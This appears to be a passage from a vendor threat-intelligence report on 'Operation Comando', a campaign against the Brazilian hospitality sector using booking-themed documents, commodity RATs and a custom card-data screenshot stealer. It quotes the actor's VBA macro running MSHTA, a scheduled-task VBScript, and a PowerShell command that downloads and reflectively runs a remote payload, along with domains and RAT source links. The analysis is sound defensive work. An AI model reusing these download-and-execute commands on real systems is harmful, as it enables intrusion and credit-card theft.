Although our initial\nanalysis didn’t show any novel or advanced techniques, we did observe strong persistence\nduring the campaign that triggered our curiosity.\n\nWe followed network traces and pivoted on the information left behind by this actor, such as\nopen directories, document metadata, and binary peculiarities, which enabled us to find a\ncustom-made piece of malware, that we named “CapturaTela”. Our discovery of this malware\nfamily shows the reason for the persistent focus on hotel reservations as a primary vector:\nstealing credit card information from customers.\n\nWe profiled this threat actor and that has resulted in uncovering not only their delivery\nmechanisms, but also their arsenal of remote access tools and info-stealing trojans, both\nacquired from underground forums as well as open source tools found in GitHub repositories.\n\nHave you ever wondered how an actor can run a very cheap and effective credit card data\nunderground business? Welcome to “Operation Comando”.\n\n# The attacker’s delivery mechanisms\n\nOur telemetry for this campaign identified email as the primary delivery mechanism and found\nthe first related samples were distributed in August 2018. Topics used by the actor are typically\nrelated to travel bookings and vouchers, and target mainly Brazilian victims. Table 1 shows a\nrepresentative list of typical subjects and attachment names found during the campaign.\n\n**Email Subject** **Attachment names**\n\n\nReserva para\ntres quartos\n\nReserva Veirano\nAdvogador\n\nCorrigir data da\nreserva para o\ndia 03\n\nVoucher para\nreserva\n\n\n“Ficha cadastral Leticia Ferreira Mendes.ppam”, “Ficha cadastral Jacinto Mendes da\nSilva.ppam”, “Ficha cadastral Marcos Portela Correa.ppam”, “Ficha cadastral Francisco\nPrado.ppam”\n\nRoominglist Veirano Advogados .docx\n\nBooking – Dados da Reserva.docx\n\nVoucher para reserva 02.docx\n\n\nReserva Voucher de Reserva ADRIANA MILLER RODRIGUES.ppa\n\nTable 1 Some email subjects and attachment names representative of this campaign.\n\nWhile investigating the malicious documents used in the campaign, we discovered an interesting\nconsistency in the document metadata. The author consistently uses an acronym throughout\ntheir work – “C.D.T Original” (see details on Figure 1).\n\n\n-----\n\nFigure 1 Example of malicious document metadata\n\nThe attackers make use of multiple common off-the-shelf methods that are observed in many\ncampaigns, such as external references to remote scripts executed by MSHTA. Following this\napproach, this actor can find multiple tools and resources to perform their activities, and at the\nsame time, make attribution and tracking more difficult for analysts. The most prevalent\ncombinations of methods observed are depicted in Figure 2.\n\nFigure 2 Multiple delivery mechanisms.\n\nAs an example of an email delivery used during December 2018 campaigns, let’s look at what\npretended to be a rooming list (SHA256:\nac70d15106cc368c571c3969c456778b494d62c5319dc366b7e2c116834c6187) which follows\n\n\n-----\n\nFigure 3 December 2018 campaign delivery example\n\nThe malicious documents contain a simple Macro, which executes a remotely-hosted script\nusing MSHTA:\n\nPublic Sub Auto_Open()\n\nvar0 = “MSHTA https://bit[.]ly/2QXNTHi”\n\nVar = var0\n\nShell (Var)\n\nEnd Sub\n\nThe landing URL resolves to:\n\nhxxps://internetexplorer200[.]blogspot[.]com/\n\nThe statistics for the URL-shortened link on bit.ly confirm the observations from our telemetry,\nshowing targets mainly in Brazil, as depicted in Figure 4 Distribution of Bit.ly campaign on 2728th December.\n\n\n-----\n\n(note the presence of Portuguese words throughout the code).\n\nFigure 5 First stage VBScript code run via MSHTA\n\nThis results in the following scheduled task created in the system, where a new second-stage\nscript is invoked via MSHTA from another remote location. Note that the second-stage VB code\ncontains a reference to “CDT” in a comment.\n\n“set shhh = CreateObject(\\”WScript.Shell\\”)\\r\\n  Dim var1\\r\\n var1 = \\”cmd.exe /c SchTasks\n/Create /sc MINUTE /MO 240 /TN AdobeUpdateSD /TR \\”\\”.exe\nhttps://minhacasaminhavidacdt.blogspot[.]com/\\”\\r\\nshhh.run var1, vbHide\\r\\n”\n\nFigure 6 Second-stage VB script\n\nThis second-stage VBScript code ends up loading a final payload in memory via PowerShell\nreflection, fetching the binary content from a file with a GIF extension:\n\n“CreateObject(\\”Wscript.Shell\\”).run \\”cmd.exe /c powershell -ExecutionPolicy Bypass windowstyle hidden -noexit -command\n\n[Reflection.Assembly]::Load([Convert]::FromBase64String((New-Object\nNet.WebClient).DownloadString(‘http://achoteis.com[.]br/images/64.gif’))).EntryPoint.Invoke($null,$null)\\”\\r\\n”\n\nThe final payload delivered in this case is Revenge Remote Access Trojan (RAT), a commodity\ntool which can be used to facilitate information theft.\n\n# Infrastructure analysis\n\n\n-----\n\nDuckDNS, WinCo, or No-IP, many of which offer free accounts lowering the investment required\nfor attacker infrastructure. Some examples of the domains in use are detailed in Table 2.\n\n**Dynamic DNS Domains**\n\nsystenfailued.ddns[.]com[.]br\n\noffice365update[.]duckdns[.]org\n\ncdtoriginal[.]ddns[.]net\n\nTable 2 Examples of domains associated with this campaign using DDNS providers\n\nIn addition to using free services, paste sites, and compromised sites, we have also identified at\nleast one domain that appears to be actor-owned. The domain “fejalconstrucoes[.]com[.]br” has\nbeen used to host payloads, as well as send emails to potential victims. Figure 7 DNS WHOIS\nrecord shows details on the domain, which has been registered using the UOL service in Brazil.\n\n\n-----\n\nFigure 7 DNS WHOIS record\n\nEmails with malicious attachments belonging to this campaign have been found with the\nfollowing characteristics:\n\nDomain: fejalconstrucoes[.]com[.]br\n\nEmail Senders: mmcorrea@fejalconstrucoes.com.br, marcos@fejalconstrucoes.com.br\n\nAttachment names: Contrato Anual FEJAL Construçoes.ppa\n\nAs mentioned before, an interesting detail on domains and paths used by the attacker is the\nuse of the recurring acronym “CDT”, as for example:\n\n\n-----\n\nhxxp://cdtoriginal.ddns[.]net\n\n# Identifying the main business driver: “CapturaTela”\n\nDuring our investigation, one open directory identified allowed us to find several payloads used\nby the attacker. Table 3 displays the set of payloads and documents found. The acronym “CDT”\nkeeps appearing even in file names used.\n\n**Filename** **SHA256**\n\nCDT.hta 4485a8f339171ca86f7e38b912f0f28072ffe04404d5062af3a60f322566f870\n\n\nCopia Detalhe da reserva –\nBooking.ppam\n\n\nac70d15106cc368c571c3969c456778b494d62c5319dc366b7e2c116834c6187\n\n\nDadosDaReserva.doc 03483d2e701f8f90c9cc46b37f12f1cef995e4cca4b5c4b9e67947f560275677\n\nDillI.js d5f4d7fb7c8042b047e9f3d93d5f02841f01889ba8a899c0c1ed7064129e3bb4\n\nquasar.jse 03d7de252c30c87d6b156b4fbcdcd008ef6bae319a9c42613aaa01428bd490e3\n\nTable 3 Contents found in an open directory at cdtmaster[.]com[.]br\n\nDespite the filename, “quasar.jse” is not QuasarRAT, but instead a JS script which contains a\nbasic base64 encoded payload dropper (see Figure 8), with a very simple and interesting payload\nfor our investigation.\n\n\n-----\n\nFigure 8 JS base64 payload dropper\n\n\n-----\n\nits main methods gives name to our malware family “CapturaTela”, and as its Portuguese name\nindicates, it has the capability to save a screenshot into a Bitmap object.\n\nFigure 9 CapturaTela method’s screen capture capabilities.\n\nThe main functionality of this malicious information-stealing trojan is the following (see Figure\n10):\n\nIterate over the open processes list and check for specific window titles. The title has to\ncontain either “ls . B” or “o . B” for the sample to perform further activity.\nIf the title is found, a screenshot will be taken and sent by email as a JPEG attachment (see\nFigure 12).\nIt will kill existing Chrome processes when done. The windows’ titles are probably based\non Chrome tag contents.\n\nFigure 10 Main functionality loop of CapturaTela\n\n\n-----\n\nIn order to validate the functionality, we decided to create a simple web page matching the title\ncontent and patched the malicious sample to use a test email account under our control (see\nFigure 12).\n\nFigure 12 Test HTML page and debugging CapturaTela functionality\n\nAs a result, as displayed in Figure 13, we confirmed the format and contents of the exfiltrated\ninformation that the attacker was planning to collect from its victims.\n\n\n-----\n\nSo, the only remaining question for our investigation was the kind of content and window titles\nthat this information-stealing trojan was looking for? Which kind of web pages could contain “ls\n\n**· B” or “o** **· B” as part of their title?**\n\nInitially, finding a website with these properties seemed to be an impossible task, but we started\nthe research based on what we knew around the targets and email delivery session metadata\nused on these campaigns. From this data, we were able to identify potential target websites\ncontaining certain – but common to the industry and nature of the business – terms in their\nwebsite page titles, in both English and Portuguese, that would match the string patternmatching described above and invoke the malware’s credit card stealing capabilities. The\nwebsites found lead us to the fact that the attacker’s focus is on getting the victim’s full credit\ncard details during a given purchase process.\n\nAfter analyzing several CapturaTela samples, and extracting the contents of the email\nconfiguration portion, several interesting strings were found as displayed in Table 4.\n\n**Interesting**\n**strings**\n\nComando30\n\nComando30@cdt\n\ncomando50\n\nThe continuous use of the “CDT” acronym, and the presence of the word “Comando”, which we\ncould associate to the first letter, led to us to choose “Operation Comando” to describe this\ncampaign.\n\n# Extensive use of Remote Access Trojans\n\nAside from the use of the custom trojan CapturaTela, the actor makes extensive use of several\nother remote access trojans to perform its malicious activities. The following RAT families has\nbeen observed during the actor campaign.\n\n**RAT Family**\n\nLimeRAT\n\nRevengeRAT\n\n\n-----\n\nAsyncRAT\n\nNanoCoreRAT\n\nRemcosRAT\n\nTable 5 Top RAT families observed in this campaign\n\nThe extensive use of these RAT tools potentially increases the business objectives, given the\namount of information the actor can obtain on top of credit card purchase results stolen from\ntarget websites via infected victims.\n\nThere are several examples of RAT families used that can be found in GitHub such as:\n\n[https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp](https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp)\n\n[https://github.com/NYAN-x-CAT/Lime-RAT](https://github.com/NYAN-x-CAT/Lime-RAT)\n\n# Overlaps with other published research\n\nSome of the domains and samples found on this investigation have been already researched\n[and reported by Yoroi. Based on the details of our research, we have a strong belief that despite](https://blog.yoroi.company/research/the-enigmatic-roma225-campaign/)\nsome minor overlaps in the techniques used, this campaign is not related to Gorgon Group.\n\n# Conclusions\n\nOperation Comando is a pure cybercrime campaign, possibly with Brazilian origin, with a\nconcrete and persistent focus on the hospitality sector, which proves how a threat actor can be\nsuccessful in pursuing its objectives while maintaining a cheap budget. The use of DDNS\nservices, publicly available remote access tools, and having a minimum knowledge on software\ndevelopment (in this case VB.NET) has been enough for running a campaign lasting month, and\npotentially gathering credit card information and other possible data.\n\nWhile cybercrime campaigns like this remain active, Palo Alto Networks customers are protected\nfrom these threats in the following ways:\n\nWildFire detects all malicious documents and payloads delivered as malware.\nAutoFocus customers can track this campaign using the following tag:\nTraps blocks all of the files associated with this campaign.\n\nPalo Alto Networks has shared our findings, including file samples and indicators of\ncompromise, in this report with our fellow Cyber Threat Alliance members. CTA members use\nthis intelligence to rapidly deploy protections to their customers and to systematically disrupt\nmalicious cyber actors.
